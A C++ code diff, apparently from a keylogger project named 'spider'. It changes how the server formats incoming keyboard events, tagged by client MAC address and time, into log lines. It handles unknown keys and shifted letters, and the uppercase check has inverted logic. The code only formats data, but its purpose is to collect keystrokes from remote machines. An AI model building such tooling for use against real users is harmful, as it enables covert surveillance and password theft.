@@ -3,6 +3,7 @@
 #include "Keys.h"
 #include <cstring>
 #include <map>
+#include <cctype>
 #include <chrono>
 
 namespace spider
@@ -185,10 +186,18 @@ namespace spider
 
       while (!m_storage.empty())
 	{
-	  EventStorage const &store = m_storage.front();
+	  // We copy it, to be able to modify the item
+	  EventStorage store = m_storage.front();
 
 	  std::string msg(
 	      reinterpret_cast<char const *>(store.header.macAddress.data()));
+
+	  // Handle unknown type
+	  if (typeMap.find(store.header.type) == typeMap.end())
+	    {
+	      store.header.type = network::tcp::PacketType::KeyboardEvent;
+	    }
+
 	  msg += " - " +
 	         timeToString(static_cast<std::time_t>(store.header.time)) +
 	         " - " + typeMap.at(store.header.type) + " - ";
@@ -197,11 +206,27 @@ namespace spider
 	    {
 	    case network::tcp::PacketType::KeyboardEvent:
 	      {
+		// Handle unknown key
+		if (keyMap.find(static_cast<client::library::KeyboardKey>(
+		        store.ev.key)) == keyMap.end())
+		  {
+		    store.ev.key = static_cast<std::uint32_t>(
+		        client::library::KeyboardKey::KB_NONE);
+		  }
 		std::string key = keyMap.at(
 		    static_cast<client::library::KeyboardKey>(store.ev.key));
 		if (store.ev.shift)
 		  {
 		    // Handle if shift is pressed
+		    if (static_cast<std::uint32_t>(
+		            spider::client::library::KeyboardKey::KB_A) >=
+		            store.ev.key &&
+		        store.ev.key <=
+		            static_cast<std::uint32_t>(
+		                spider::client::library::KeyboardKey::KB_Z))
+		      {
+			key[0] = static_cast<char>(std::toupper(key[0]));
+		      }
 		  }
 
 		msg += key + " - " + stateMap.at(store.ev.state) + " [" +
